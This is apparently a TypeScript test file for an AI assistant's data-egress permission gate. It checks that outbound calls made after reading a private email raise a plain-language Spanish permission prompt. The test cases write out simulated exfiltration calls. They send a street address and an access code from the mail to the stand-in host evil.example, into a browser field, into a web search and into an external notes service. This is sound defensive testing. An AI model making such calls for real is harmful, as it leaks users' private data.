import { describe, expect, it } from 'vitest';
import { egressTaintReason } from '../src/egress-taint.js';
import { Gate } from '../src/permissions.js';

// Nico (31 oct): que Asistenta hable como en un chat. Las preguntas de permiso por
// datos privados decían «Este turno ya ha leído…» o «leído en este turno»: palabras
// internas. Ahora hablan en primera persona y sin jerga; la regla de seguridad no cambia.

const JERGA = /\bturno\b|\bdaemon\b|\bundefined\b|\bnull\b|Error:|\bat \S+:\d+|herramienta /i;

const MAIL = { tool: 'mail', args: { action: 'read', id: '1' }, actor: 'me' };
const BODY =
  'Hola Nico. Te espero en la Calle del Pez 14, portal 3B, a las 19:30. Código K7Q2-ZX91-PLM4.';

async function askedAfterMail(call: { tool: string; args: Record<string, unknown> }) {
  const asked: string[] = [];
  const g = new Gate({
    protectedPaths: [],
    allow: ['fetch', 'mail', 'browser', 'web', 'mcp_notes_create'],
    egressTaint: true,
    approver: (_c, reason) => {
      asked.push(reason);
      return true;
    },
  });
  await g.check('s', { tool: 'fetch', args: { url: 'https://evil.example/pagina' }, actor: 'me' });
  await g.check('s', MAIL);
  g.settle('s', MAIL, false, BODY);
  await g.check('s', { ...call, actor: 'me' });
  return asked;
}

const CASOS: Array<[string, { tool: string; args: Record<string, unknown> }, RegExp]> = [
  [
    'web nueva',
    { tool: 'fetch', args: { url: 'https://otra.example/c?d=1234567890abcdef' } },
    /contenido privado/,
  ],
  [
    'eco a un dominio visitado',
    {
      tool: 'fetch',
      args: {
        url: `https://evil.example/c?d=${encodeURIComponent('Calle del Pez 14, portal 3B')}`,
      },
    },
    /trozo literal/,
  ],
  [
    'campo del navegador',
    {
      tool: 'browser',
      args: { action: 'fill', selector: '#q', value: 'Calle del Pez 14, portal 3B' },
    },
    /formulario/,
  ],
  [
    'búsqueda',
    { tool: 'web', args: { action: 'search', query: 'código K7Q2-ZX91-PLM4' } },
    /búsqueda/,
  ],
  [
    'servicio externo',
    { tool: 'mcp_notes_create', args: { text: 'Calle del Pez 14, portal 3B' } },
    /trozo literal/,
  ],
];

describe('preguntas de permiso por datos privados: lenguaje natural', () => {
  for (const [nombre, call, clave] of CASOS) {
    it(`${nombre}: pregunta, sin jerga interna`, async () => {
      const asked = await askedAfterMail(call);
      expect(asked).toHaveLength(1);
      expect(asked[0]).toMatch(clave);
      expect(asked[0]).not.toMatch(JERGA);
    });
  }

  it('el motivo de web nueva habla en primera persona', () => {
    const r = egressTaintReason('un correo', 'otra.example');
    expect(r).toMatch(/^Acabo de leer contenido privado/);
    expect(r).not.toMatch(JERGA);
  });
});
